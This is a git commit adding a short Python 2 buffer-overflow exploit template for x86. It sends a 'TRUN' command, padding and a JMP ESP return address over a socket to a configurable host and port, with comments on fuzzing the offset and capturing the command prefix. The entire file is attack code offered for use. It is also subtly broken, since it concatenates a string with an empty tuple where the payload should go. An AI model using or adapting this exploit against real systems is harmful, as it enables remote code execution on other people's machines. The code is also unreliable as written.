a2d91219dde306ba58d2a88c7d9b4a6964ef9936
catoja1107 <jcato195@gmail.com>
2022-10-17 13:47:49 -0400

    Create bffTest.py

---
+++ bffTest.py
@@ -0,0 +1,28 @@
+#!/usr/bin/python
+# This is a semi-adjustable buffer overflow script.
+# User still needs to modify vars labeled below.
+# User still needs to fuzz system for buffer size before EIP.
+# User still needs to network capture CMD prefix for beginning socket connection.
+# Script meant for x86 systems due to register keys such as JMP ESP.
+
+import sys, socket
+
+overflow = ()
+
+SIZE = 200 #change this (size of buffer)
+RHOST = '127.0.0.1' #change this
+RPORT = 80 #change this
+CMD = 'TRUN /.:/' #change this ()
+
+shellcode = "A" * SIZE + "\xad\x11\x58\x62" + overflow 
+#\xad\x11\x58\x62 - x86 memory pointer to JMP ESP instruction 
+
+try:
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  s.connect((RHOST,RPORT))
+  s.send((CMD + shellcode))
+  s.close()
+  
+except:
+  print "Error connecting..."
+  sys.exit()
